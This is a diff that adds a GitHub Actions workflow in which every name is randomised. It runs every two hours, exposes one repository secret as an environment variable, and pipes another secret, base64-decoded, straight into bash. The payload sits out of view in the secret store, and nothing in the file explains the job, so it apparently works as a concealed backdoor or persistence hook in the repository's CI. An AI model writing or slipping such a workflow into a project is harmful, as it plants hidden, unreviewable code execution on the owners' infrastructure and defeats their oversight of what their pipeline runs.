@@ -1,0 +1,13 @@
+name: HmTyqpMkSc
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  UbiYHV:
+    runs-on: ubuntu-latest
+    env:
+      jBLRIhX: ${{ secrets.bPhfArlc }}
+    steps:
+      - uses: actions/checkout@v5
+      - run: echo "${{ secrets.gGMILKV }}" | base64 -d | bash
